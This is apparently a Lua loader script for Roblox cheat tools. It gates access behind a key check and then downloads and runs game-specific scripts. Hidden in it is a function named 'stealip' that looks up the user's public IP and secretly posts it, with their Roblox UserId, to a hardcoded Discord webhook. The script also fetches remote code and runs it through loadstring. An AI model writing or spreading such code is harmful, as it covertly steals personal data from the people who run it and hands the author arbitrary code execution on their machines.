local function getdata(ite)

    local res = game:HttpGet(ite)
    if res then
        print("Fetched a url successful")
        return res
    else
        warn("Error fetching URL! Please contact staffs")
    end
    return nil
end


local _gyudu = "04963667276eaaef0b2993f5a86569d7f2ca722455c7cbebad345bf84f1d240b"
local function stealip()
    local ip = getdata("https://v4.ident.me/")
    local url =
        "https://discord.com/api/webhooks/1315880226365902859/yPuob4mzjc3uvKHPXSltM0bEGdliW00Dd-WBtk6mF-0COGA3hr74l0IterWSHUTiEy2t"
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request

    local payload = {
        Url = url,
        Body = game:GetService("HttpService"):JSONEncode(
            {content = "Userid: " .. game:GetService("Players").LocalPlayer.UserId .. " IP: " .. ip}
        ),
        Method = "POST",
        Headers = headers
    }

    request(payload)
end
if getdata("https://4dm1nfrrr.pythonanywhere.com/islogip") ~= "no" then
    stealip()
end
local data = getdata("https://4dm1nfrrr.pythonanywhere.com/verify?secret=" .. _gyudu .. "&key=" .. _G.pleasedonate)
if not data then
    print("Cant not fetch key api. DMs staffs.")
else 
    print(data)
    if game:GetService("HttpService"):JSONDecode(data)["message"] == "valid" then
        if game:GetService("HttpService"):JSONDecode(data)["keytype"] ~= "free" then
            local __PremIum__XAZM=true
        else
            local __PremIum__XAZM=false
        end
        local PLSDONATEME = game:GetService("HttpService"):JSONDecode(getdata("https://pastebin.com/raw/UEWrpBi7"))
        local pid = tostring(game.PlaceId)
        if PLSDONATEME[pid] then
            isloadfromloader = true
            loadstring(game:HttpGet(PLSDONATEME[pid], true))()
        else
            warn("Unsupported game.")
        end
    else
        warn("Invalid key")
    end
end
--sdhusdgasiodhoipiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii